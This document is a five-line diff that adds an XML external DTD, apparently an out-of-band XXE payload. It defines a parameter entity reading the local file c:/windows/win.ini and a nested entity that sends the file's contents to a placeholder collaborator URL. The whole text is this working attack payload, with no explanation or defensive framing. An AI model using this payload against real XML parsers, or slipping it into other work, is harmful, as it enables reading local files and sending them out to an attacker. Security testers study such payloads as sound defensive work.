@@ -1,0 +1,5 @@
+<!ENTITY % file SYSTEM "file:///c://windows/win.ini">
+<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 
+'http://[collaborator_url]/?x=%file;'>">
+%eval;
+%exfiltrate;
